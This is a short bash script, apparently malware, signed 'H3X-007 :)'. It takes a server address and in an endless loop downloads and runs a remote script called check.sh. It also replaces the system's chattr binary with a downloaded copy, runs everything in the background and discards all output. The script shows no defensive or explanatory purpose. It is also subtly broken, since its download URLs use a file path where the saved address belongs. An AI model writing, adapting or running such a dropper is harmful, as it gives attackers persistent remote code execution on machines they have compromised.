#!/bin/bash
#H3X-007 :)

script_path="/etc/check"
HOST="/etc/host"
ip_address="$1"

if [ -z "$ip_address" ]; then
    exit 1
fi

# Save the IP address to a file for future use
echo "$ip_address" > "$HOST"

while true; do
    if [ ! -f "$script_path" ]; then
        wget "http://$HOST/check.sh" -O "$script_path" >/dev/null 2>&1
        chmod +x "$script_path"
    else
        cp "$script_path" "/tmp/check.sh" >/dev/null 2>&1
        wget "http://$HOST/check.sh" -O "$script_path" >/dev/null 2>&1
        chmod +x "$script_path"
        cp "/tmp/check.sh" "$script_path" >/dev/null 2>&1
        rm "/tmp/check.sh" >/dev/null 2>&1
    fi

    chattr_path="/usr/bin/chattr"

    if [ ! -f "$chattr_path" ]; then
        wget "http://$HOST/chattr" -O "$chattr_path" >/dev/null 2>&1
        chmod +x "$chattr_path"
    else
        cp "$chattr_path" "/tmp/chattr" >/dev/null 2>&1
        wget "http://$HOST/chattr" -O "$chattr_path" >/dev/null 2>&1
        chmod +x "$chattr_path"
        cp "/tmp/chattr" "$chattr_path" >/dev/null 2>&1
        rm "/tmp/chattr" >/dev/null 2>&1
    fi

    nohup "$script_path" >/dev/null 2>&1 &

    
    sleep 1
done
